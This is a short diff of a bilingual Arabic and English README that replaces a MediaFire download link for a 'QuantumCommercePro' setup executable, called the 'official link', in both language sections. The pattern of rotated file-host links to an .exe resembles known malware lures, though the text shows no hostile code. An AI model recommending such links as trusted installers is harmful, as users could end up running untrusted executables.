@@ -13,7 +13,7 @@
 
 1. **تحميل الملف:**
    - حمّل `QuantumCommercePro-Setup-v1.1.0.exe` من الرابط الرسمي:
-     https://www.mediafire.com/file/26g4fcon7y0166j/QuantumCommercePro-Setup-v1.1.0.exe/file
+     https://www.mediafire.com/file/70dgv1q51pnsbjs/QuantumCommercePro-Setup-v1.1.0.exe/file
 
 2. **تشغيل الإعداد:**
    - انقر بزر الماوس الأيمن على الملف
@@ -84,7 +84,7 @@
 
 1. **Download the file:**
    - Download `QuantumCommercePro-Setup-v1.1.0.exe` from the official link:
-     https://www.mediafire.com/file/26g4fcon7y0166j/QuantumCommercePro-Setup-v1.1.0.exe/file
+     https://www.mediafire.com/file/70dgv1q51pnsbjs/QuantumCommercePro-Setup-v1.1.0.exe/file
 
 2. **Run the setup:**
    - Right-click on the downloaded file
